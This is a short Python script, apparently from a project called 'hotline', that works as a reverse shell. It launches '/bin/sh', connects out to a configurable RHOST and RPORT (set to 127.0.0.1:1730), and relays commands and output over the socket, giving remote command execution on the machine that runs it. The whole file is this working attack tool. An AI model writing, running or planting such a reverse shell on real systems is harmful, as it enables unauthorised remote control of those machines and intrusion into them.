import socket
import time
from hotline.shells import Shell

RHOST = '127.0.0.1'
RPORT = 1730
PAYLOAD = ['/bin/sh']


def main():
    shell = Shell(PAYLOAD)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    while True:
        s.sendall('> '.encode('utf8'))
        shell.write(s.recv(1024).decode('utf8'))
        time.sleep(.01)
        while shell.can_read():
            s.sendall(shell.read().encode('utf8'))

if __name__ == "__main__":
    main()
